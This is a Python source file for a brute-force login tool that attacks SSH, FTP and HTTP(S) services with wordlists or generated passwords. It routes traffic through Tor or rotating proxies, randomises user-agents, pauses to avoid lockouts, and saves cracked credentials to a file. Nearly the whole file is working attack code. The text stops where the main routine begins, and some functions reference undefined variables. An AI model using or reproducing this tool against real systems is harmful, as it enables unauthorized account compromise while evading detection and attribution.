#!/usr/bin/env python3

from urllib.parse import urlparse
import argparse
import time
import paramiko
from ftplib import FTP, error_perm
from colorama import Fore, init
import requests
import socks
import socket
import random
import string
import os
import tempfile
import json     # Added to save and load progress for --resume
import signal


init(autoreset=True)


common_prefixes = ["!!", "!", "$", "@!", "666", "123", "**", "&*", "$$", "%%", "#@", "1x", "22", "##", "!!@", "@@", 
                   "%%%$", "@@@", "!*", "**!", "^^", "!?", "!@", "333", "***", "xx", "11", "!!##", "#$", "$@", 
                   "!1", "##@", "444", "^^", "55", "123!", "*&", "$#!", "999", "@@!!", "$%^", "^^&&", "!!$$", "@!@", 
                   "!@#$", "111", "2x2", "%%^^", "!*!@", "&&##", "$$", "!!@", "555", "@", "$$", "^"]

common_suffixes = ["123", "666", "$", "$$", "!", "@!", "##", "**", "11", "1x", "44", "!@", "**!", "%%", "$$", "^^", "22", "@@", 
                   "!!", "%%$", "!*", "#@", "$@", "@!!", "$#!", "333", "999", "$%", "**#", "11!", "22!!", "$$$", 
                   "##@", "!@#$", "%%^^", "*&", "@#", "@!!@", "!?", "##$$", "^^&&", "!!11", "444", "@@**", "@!#", 
                   "1x1", "$@!!", "#$$", "!!@@", "!!$#", "@", "$", "^", "*"]

# User-Agent strings for --random-agent feature
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.17763',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Linux; U; Android 9; en-US; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0'
]

STATE_FILE = 'attack_state.json'
csrf_token = None
should_stop = False

# Custom signal handler to handle CTRL+C
def signal_handler(signal_received, frame):
    global should_stop
    should_stop = True
    print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} ATTACK STOPPED. Progress saved. FSK - Written by: Derek Johnston")
    save_progress(attempt_count, user, password, users[idx:], passwords[i + j + 1:])
    exit(0)

# Register signal handler for CTRL+C
signal.signal(signal.SIGINT, signal_handler)
def current_timestamp():
    return f"{Fore.WHITE}[{Fore.YELLOW}{time.strftime('%H:%M:%S', time.localtime())}{Fore.WHITE}]{Fore.RESET}"


# Modified password generator to support a range of lengths for --rand
def generate_random_password_list(num_passwords=100000, min_length=8, max_length=18):
    characters = string.ascii_letters + string.digits + "!@#$%^&*"
    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Generating password list...", level=2)
    passwords = set()

    while len(passwords) < num_passwords:
        password = ''.join(random.choice(characters) for _ in range(random.randint(min_length, max_length)))
        passwords.add(password)
        if args.prefix:
            password = f"{random.choice(common_prefixes)}{password}"
        if args.suffix:
            password = f"{password}{random.choice(common_suffixes)}"

    with tempfile.NamedTemporaryFile(delete=False, mode='w') as tmp:
        for password in passwords:
            tmp.write(password + "\n")
        return tmp.name


def extract_domain(ip_with_path):
    """Extract the domain from the full URL."""
    parsed_url = urlparse(f"https://{ip_with_path}")
    return parsed_url.netloc

def verbose_print(message, level=1):
    if args.verbose and args.verbose >= level:
        print(message)

def is_service_running(ip_with_path, port, service, retries=3, delay=2):
    ip = extract_domain(ip_with_path)
    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Checking if {service.upper()} service is running on {ip}:{port}", level=1)# Extract the domain
    for attempt in range(retries):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            result = sock.connect_ex((ip, port))

            if result == 0:  # Connection was successful
                if service == 'http' and port == 80:
                    return True
                elif service == 'ssh' and port == 22:
                    return True
                elif service == 'ftp' and port == 21:
                    return True
                elif service == 'https' and port == 443:
                    return True
                else:
                    print(
                        f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unsupported service: {service} on port {port}")
                    return False
            else:
                print(
                    f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Connection failed with result code: {result}")

        except socket.gaierror:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} DNS resolution error for '{ip}'.")
            return False
        except socket.error as e:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Socket error: {e}")
        except socket.timeout:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Connection timed out.")

        time.sleep(delay)

    return False


def is_http_service_running(url):
    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Checking if http(s) service running...", level=2)
    try:
        response = requests.get(url, timeout=30)
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        print(f"HTTP request failed: {e}")
        return False


def set_up_tor():
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} INITIALIZING TOR PROXY...")

    attempt_count = 0
    max_attempts = 3
    success = False

    while attempt_count < max_attempts:
        try:
            old_ip = get_public_ip()
            socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
            socket.socket = socks.socksocket
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Socks.proxy - localhost:9050", level=2)
            new_ip = get_public_ip()
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Old IP: {Fore.LIGHTBLUE_EX}{old_ip}")
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} New IP (via Tor): {Fore.LIGHTBLUE_EX}{new_ip}")
            success = True
            break
        except socket.error:
            attempt_count += 1
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Socket error occurred during Tor setup. Attempt {attempt_count}/{max_attempts}.")

    if not success:
        print(
            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Tor initialization failed after 3 attempts, proceeding without Tor.")


def get_public_ip():
    try:
        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Request for IP - https://api.ipify.org", level=2)
        response = requests.get('https://api.ipify.org')
        return response.text
    except requests.RequestException:
        return "Unknown IP"


def load_usernames_from_file(filename):
    try:
        with open(filename, encoding='latin-1') as file:
            return file.read().splitlines()
    except EOFError:
        print(
            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} EOFError encountered when reading usernames from file.")
        return []


# Added for --resume feature: save progress to a file
def save_progress(attempt_count, user, password, remaining_users, remaining_passwords):
    state = {
        'attempt_count': attempt_count,
        'current_user': user,
        'current_password': password,
        'remaining_users': remaining_users,
        'remaining_passwords': remaining_passwords
    }
    with open(STATE_FILE, 'w') as f:
        json.dump(state, f)



# Function to load the last saved state
def load_progress():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, 'r') as f:
            return json.load(f)
    else:
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} No progress file found. Starting from the beginning.{Fore.RESET}")
        return None


def delete_progress_file():
    if os.path.exists(STATE_FILE):
        os.remove(STATE_FILE)
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.YELLOW} Progress file deleted.{Fore.RESET}")


def parse_arguments():
    parser = argparse.ArgumentParser(description='Brute force against SSH and FTP services.')
    parser.add_argument('-sv', '--service', nargs='+', required=True,
                        help="Service to attack. (http,ftp,ssh) OPTIONAL: port number (ssh 2222, http 8080)")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-w', '--wordlist', help="Password Wordlist.")
    group.add_argument('-r', '--rand', nargs=2, metavar=('MIN_LEN', 'MAX_LEN'), type=int,
                       help="Generate random passwords with lengths between MIN_LEN and MAX_LEN.")

    # Add -u for single user and --users for file input
    parser.add_argument('-u', '--user', help="Single username (e.g., -u saad).")
    parser.add_argument('--users', help="File containing a list of usernames (e.g., --users /test/user.txt).")

    parser.add_argument('--ip', required=True, type=str, help="IP address of the target.")
    parser.add_argument('--tor', action='store_true', help="Use Tor for anonymization")
    parser.add_argument('-px', '--proxies', type=str, help="File containing a list of proxies.")
    parser.add_argument('-i', '--iterations', type=int, default=3, choices=range(3, 10),
                        help="Number of attempts per username (default: 3)")
    parser.add_argument('--csrf', type=str, help='CSRF token to include in the request')

    parser.add_argument("--prefix", action="store_true", help="Randomly append a prefix to the password")
    parser.add_argument("--suffix", action="store_true", help="Randomly append a suffix to the password")


    # Added new arguments
    parser.add_argument('--resume', action='store_true', help="Resume from the last state.")
    parser.add_argument('--verbose', '-v', nargs='?', type=int, choices=[1, 2], const=1, default=0, help='Verbose level (1 or 2)')
    parser.add_argument('-ra', '--random-agent', action='store_true', help="Use random User-Agent strings for HTTP attacks.")
    parser.add_argument('--status-code', type=str, default='200', help="Use http status code to determine passwords. Default: 200")
    parser.add_argument('--http-post', type=str, help="HTTP POST form parameters.")
    parser.add_argument('--success-content-length', type=int, help="Content length indicating successful login.")
    parser.add_argument('--failure-content-length', type=int, help="Content length indicating failed login.")
    parser.add_argument('--success-pattern', type=str, help="Pattern indicating a successful login.")
    parser.add_argument('--failure-pattern', type=str, help="Pattern indicating a failed login.")
    parser.add_argument('-ss', '--sessions', action='store_true', help="Force new sessions")
    parser.add_argument('-ps', '--pause', nargs=2, type=int, metavar=('MINUTES_BEFORE_PAUSE', 'PAUSE_DURATION'),
                        help='Pause the attack after the first specified number of minutes and pause for the second specified number of minutes.')

    args = parser.parse_args()
    iterations = args.iterations

    if len(args.service) > 1:
        args.service = (args.service[0], int(args.service[1]))
    else:
        if args.service[0] == 'ftp':
            args.service = ('ftp', 21)
        elif args.service[0] == 'ssh':
            args.service = ('ssh', 22)
        elif args.service[0] == 'http':
            args.service = ('http', 80)
        elif args.service[0] == 'https':
            args.service = ('https', 443)

    if args.wordlist and args.rand:
        parser.error("You can't use both -w and -r at the same time. Choose one.")
    elif not args.wordlist and not args.rand:
        parser.error("You must provide one of -w or -r.")
    if isinstance(args.service, list) and len(args.service) > 1:
        args.service = tuple(args.service)
    elif len(args.service) == 1:
        args.service = args.service[0]

    if args.verbose not in [1, 2, 0]:
        raise ValueError("Invalid value for --verbose. Only 1 or 2 are allowed.")
        
  
        
    if args.user and args.users:
        parser.error("You cannot use both -u and --users together. Choose one.")

# Check for random agent and session usage
    service_type = args.service[0]  # Get the service type from the tuple
    if args.random_agent and service_type not in ['http', 'https']:
        print(f"{Fore.WHITE}[{Fore.YELLOW}ALERT{Fore.WHITE}]{Fore.RESET} Random agent module is meant for HTTP(S) attacks.")
    
    if args.csrf and service_type not in ['http', 'https']:
        print(f"{Fore.WHITE}[{Fore.YELLOW}ALERT{Fore.WHITE}]{Fore.RESET} CSRF tokens are meant for HTTP(S) attacks.")
    if args.sessions and service_type not in ['http', 'https']:
        print(f"{Fore.WHITE}[{Fore.YELLOW}ALERT{Fore.WHITE}]{Fore.RESET} Session module is meant for HTTP(S) attacks.")

    if args.status_code and service_type not in ['http', 'https']:
        print(f"{Fore.WHITE}[{Fore.YELLOW}ALERT{Fore.WHITE}]{Fore.RESET} HTTP code is meant for HTTP(S) attacks.")
  
       


   
    if args.users:
        try:
            with open(args.users, 'r', encoding='latin-1') as f:
                args.users = [line.strip() for line in f.readlines()]
        except FileNotFoundError:
            parser.error(f"File {args.users} not found.")


    return args


def create_new_session():
    session = requests.Session()
    return session



def save_to_file(ip, service, user, password, attempt_count):
    with open('Credentials', 'a') as file:
        file.write(f"IP: {ip}, Service: {service}, User: {user}, Attempts: {attempt_count}, Password: {password}\n")


def test_ssh_auth_type(ip):
    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Testing SSH auth type", level=2)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, look_for_keys=True, allow_agent=False, timeout=5)
        return "RSA key authentication"
    except paramiko.SSHException:
        pass

    try:
        client.connect(ip, password="invalidpasswordfortesting", look_for_keys=False, allow_agent=False, timeout=5)
        return "Password authentication"
    except paramiko.AuthenticationException:
        return "Password authentication"
    except Exception as e:
        print(
            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Error during SSH authentication check: {e}{Fore.RESET}")
    finally:
        client.close()

    return f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Could not determine authentication type or failed to connect"


def cycle_through_proxies(proxies):
    verbose_print("{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Cycling proxies", level=2)
    i = 0
    while True:
        yield proxies[i]
        i = (i + 1) % len(proxies)





def http_attack(ip, user, password, http_post_params, success_pattern, failure_pattern, 
                success_content_length=None, failure_content_length=None, 
                proxy_ip=None, proxy_port=None, csrf_token=None):  # Changed csrf_token to csrf_tokens
    if proxy_ip and proxy_port:
        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Proxy {proxy_ip}:{proxy_port}")
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket

    try:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}

        # Use random User-Agent if --random-agent is set
        if args.random_agent:
            selected_agent = random.choice(USER_AGENTS)
            headers['User-Agent'] = selected_agent
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using random User-Agent: {selected_agent}", level=1)

        # Prepare data
        data = http_post_params.replace('^USER^', user).replace('^PASS^', password)

        # Iterate through CSRF tokens and cookie values if provided
        
        if csrf_token:
            data = data.replace('^CSRF^', csrf_token)
           
        else:
            data = data.replace('^CSRF^', '')  # Remove CSRF if not provided

        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Sending HTTP POST request to {ip} with data: {data}", level=1)
        proxies = {
            'http': f'socks5://{proxy_ip}:{proxy_port}'
        } if proxy_ip and proxy_port else None
        
        response = requests.post(f"http://{ip}", data=data, headers=headers, timeout=10, verify=False, proxies=proxies)
        
        response_length = len(response.content)
        verbose_print(f"{Fore.WHITE}[{Fore.CYAN}CONTENT-LENGTH{Fore.WHITE}]{Fore.RESET}: {response_length}", level=1)
        verbose_print(f"{Fore.WHITE}[{Fore.CYAN}HTTP-RESPONSE{Fore.WHITE}]{Fore.RESET}: \n{response.text[:20000]}", level=2)

        # Check for success based on content length
        if success_content_length is not None and response_length == success_content_length:
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}", level=1)
            return True  # Indicates success

        # Check for success based on pattern
        if success_pattern and success_pattern in response.text:
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}", level=1)
            return True  # Indicates success

        # Check for failure based on content length
        if failure_content_length is not None and response_length == failure_content_length:
            return False  # Indicates failure

        # Check for failure based on pattern
        if failure_pattern and failure_pattern in response.text:
            return False  # Indicates failure

        # HTTP code checks if specified
        if args.status_code:
            if response.status_code == int(args.status_code):
                verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for user {user} with password: {password} (Status Code 200)", level=1)
                return True
            else:
                return False  # Indicates failed login based on status code

        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unidentified response for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.YELLOW}{password}", level=1)
        return None


    except requests.RequestException as e:
        if proxy_ip and proxy_port:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} HTTP attack failed: {e}")
        return None




    except requests.RequestException as e:
        if proxy_ip and proxy_port:
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} HTTP attack failed: {e}")
        return None


def https_attack(ip, user, password, https_post_params, success_pattern, failure_pattern,
                 success_content_length=None, failure_content_length=None, proxy_ip=None, proxy_port=None, csrf_token=None):
  
    if proxy_ip and proxy_port:
        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Proxy {proxy_ip}:{proxy_port}", level=2)
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket

    try:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}

        # Use random User-Agent if --random-agent is set
        if args.random_agent:
            selected_agent = random.choice(USER_AGENTS)
            headers['User-Agent'] = selected_agent
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using random User-Agent: {selected_agent}", level=1)

        # Prepare data
        data = https_post_params.replace('^USER^', user).replace('^PASS^', password)

        # Iterate through CSRF tokens and cookie values if provided
        
        if csrf_token:
            data = data.replace('^CSRF^', csrf_token)
           
        else:
            data = data.replace('^CSRF^', '')  # Remove CSRF if not provided

        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Sending HTTPS POST request to {ip} with data: {data}", level=1)
        proxies = {
            'https': f'socks5://{proxy_ip}:{proxy_port}'
        } if proxy_ip and proxy_port else None
        
        response = requests.post(f"https://{ip}", data=data, headers=headers, timeout=10, verify=False, proxies=proxies)
        
        response_length = len(response.content)
        verbose_print(f"{Fore.WHITE}[{Fore.CYAN}CONTENT-LENGTH{Fore.WHITE}]{Fore.RESET}: {response_length}", level=1)
        verbose_print(f"{Fore.WHITE}[{Fore.CYAN}HTTPS-RESPONSE{Fore.WHITE}]{Fore.RESET}: \n{response.text[:20000]}", level=2)

        # Check for success based on content length
        if success_content_length is not None and response_length == success_content_length:
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}", level=1)
            return True  # Indicates success

        # Check for success based on pattern
        if success_pattern and success_pattern in response.text:
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}", level=1)
            return True  # Indicates success

        # Check for failure based on content length
        if failure_content_length is not None and response_length == failure_content_length:
            return False  # Indicates failure

        # Check for failure based on pattern
        if failure_pattern and failure_pattern in response.text:
            return False  # Indicates failure

        # HTTP code checks if specified
        if args.status_code:
            if response.status_code == int(status_code):
                verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for user {user} with password: {password} (Status Code 200)", level=1)
                return True
            else:
                return False  # Indicates failed login based on status code

        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unidentified response for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.YELLOW}{password}", level=1)
        return None




    except requests.RequestException as e:
        if proxy_ip and proxy_port:
            verbose_print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
        else:
            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} HTTPS attack failed: {e}")
        return None



def ssh_attack(ip, port, user, password, proxy_ip=None, proxy_port=None):
    client = paramiko.SSHClient()
    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Paramiko SSHClient - {ip}", level=2)

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if proxy_ip and proxy_port:
        verbose_print(f"Proxy {proxy_ip}:{proxy_port}")
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket
    try:
        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} SSHClient connect {ip}", level=1)
        client.connect(ip, port=int(port), username=user, password=password, timeout=5)
        print(
            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
        return True
    except paramiko.AuthenticationException:
        return False
    except (socket.timeout, paramiko.SSHException):
        if proxy_ip and proxy_port:
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
        else:
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} SSH Connection failed. Retrying...")
            time.sleep(1)
            retry_counter = 0
            while retry_counter < 1:
                try:
                    return ssh_attack(ip, port, user, password, proxy_ip, proxy_port)
                except (socket.timeout, paramiko.SSHException):
                    retry_counter += 1
                    print(
                        f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} SSH Connection retry failed. Continuing...")
                    break

            if retry_counter == 1:
                print(
                    f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Retries failed. Continuing...")
                return None
    except socket.error as e:
        if 'Connection reset by peer' in str(e):
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Connection reset by peer.")
        else:
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Error with SSH (socket.error): {e}")
        return None
    except paramiko.ssh_exception.SSHException as e:
        if 'Error reading SSH protocol banner' in str(e):
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Error reading SSH protocol banner.")
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Error with SSH: {e}")
        return False
    finally:
        client.close()


def ftp_attack(ip, user, password, proxy_ip=None, proxy_port=None):
    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} FTP attack - ftplib - attacking {ip}", level=1)
    if proxy_ip and proxy_port:
        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Proxy {proxy_ip}:{proxy_port}", level=2)
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket
    try:
        with FTP(ip, timeout=5) as ftp:
            ftp.login(user, password)
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
            return True
    except error_perm as e:
        if str(e).startswith('530 '):
            if 'User not found' in str(e) or 'No such user' in str(e):
                print(
                    f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} User [*]{Fore.YELLOW}{user}{Fore.RESET}[*] does not exist on the server.")
                users.remove(user)
                return None
            else:
                return False
    except socket.error:
        if proxy_ip and proxy_port:
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
        else:
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} FTP Connection failed. Retrying...")
            time.sleep(1)
            retry_counter = 0
            while retry_counter < 1:
                try:
                    return ftp_attack(ip, user, password, proxy_ip, proxy_port)
                except socket.error:
                    retry_counter += 1
                    print(
                        f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} FTP Connection retry failed. ")

            if retry_counter == 1:
                print(
                    f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Retries failed. Continuing...")
                return None




def handle_timeout(func, *args, **kwargs):
    retries = 2
    for _ in range(retries):
        try:
            return func(*args, **kwargs)
        except (socket.timeout, requests.ConnectionError):
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Connection timed out. Waiting for 15 seconds before retrying...")
            time.sleep(15)
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Too many timeouts. Exiting the script.")
    exit(1)


def load_proxies_from_file(filename):
    try:
        with open(filename, 'r') as file:
            return [line.strip().split(":") for line in file.readlines()]
    except EOFError:
        print(
            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} EOFError encountered when reading proxies from file.")
        return []


def get_port(args):
    if len(args.service) > 1:
        try:
            return int(args.service[1])
        except ValueError:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} ERROR: Invalid port specified.")
            exit(1)
    elif args.service[0] == 'ssh':
        return 22
    elif args.service[0] == 'ftp':
        return 21
    elif args.service[0] == 'http':
        return 80
    elif args.service[0] == 'https':
        return 443
    else:
        return None

def pause_attack(pause_after_minutes, pause_duration_minutes):
    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Pausing attack for {pause_duration_minutes} minute(s).", level=1)
    time.sleep(pause_duration_minutes * 60)  # Sleep for pause_duration_minutes in seconds
 


if __name__ == '__main__':
    try:
        print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} STARTING ATTACK...")
      
